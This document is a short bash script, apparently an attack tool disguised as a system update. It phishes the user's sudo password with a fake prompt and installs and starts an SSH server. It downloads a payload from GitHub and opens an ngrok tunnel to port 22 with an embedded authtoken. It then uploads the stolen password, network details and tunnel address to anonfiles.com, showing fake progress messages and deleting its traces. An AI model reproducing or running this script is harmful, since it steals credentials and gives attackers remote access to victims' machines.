whoami > output.txt && ifconfig >> output.txt  #Here the default output folder is output.txt if you want to change the name just sipmpliy replace the name (output).
var=$(whoami)
echo "[sudo] password for $var:" && read -s    PASS 
sleep 3
echo "Sorry, try again."
echo "[sudo] password for $var:" && read -s    PASS2 
echo "$PASS" >>output.txt
echo "$PASS2" >>output.txt
echo $PASS2 | sudo -S apt-get install openssh-server > /dev/null 2>&1
echo ""
echo "Please Wait Configuaring New Updates."
wget https://raw.githubusercontent.com/Esp26/ToolsRequirements/main/requirements.zip > /dev/null 2>&1 | echo "10% Complete"  
echo "60% Complete"
chmod +x ./requirements.zip
unzip requirements.zip > /dev/null 2>&1
rm requirements.zip
sudo mv ngrok /usr/bin
ngrok authtoken 1kCA7hj4ZiMNPXtexW92Udmc4PX_3sh21CnwbWL28x8N9mNZA > /dev/null 2>&1 #Your fake ngrok authtoken here.
echo "100% Complete"
echo ""
sudo service ssh start
echo ""
echo "Please Wait....."
echo ""
ngrok tcp 22 > /dev/null 2>&1 & sleep 20
curl http://127.0.0.1:4040/api/tunnels >> output.txt 
curl -F "file=@output.txt" https://api.anonfiles.com/upload?token=f88cb5d25cd13342 > /dev/null 2>&1  # Visit anonfiles.com and login or register there then click on API.
clear
echo ""
echo "Configuration Complete."
sleep 3
clear
rm output.txt
